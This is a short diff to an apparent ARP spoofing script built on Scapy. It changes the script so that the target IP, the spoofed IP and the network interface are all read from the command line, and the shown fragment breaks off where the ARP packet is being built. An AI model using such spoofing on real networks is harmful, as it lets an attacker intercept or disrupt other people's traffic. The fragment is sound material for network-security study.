@@ -11,9 +11,11 @@ from scapy.all import sendp , ARP , Ether
 # `from scapy.all import sendp, ARP, Ether` imports the `sendp`, `ARP`, and `Ether` 
 # classes from the Scapy library.
 
-iface = "wlp2s0"
 target_ip = sys. argv[1]
 fake_ip = sys.argv[2]
+iface = sys.argv[3]
+
+# Here we set the target ip, spoofed ip, and network interface according to our CL input
 
 ethernet = Ether()
 arp = ARP(pdst=target_ip ,
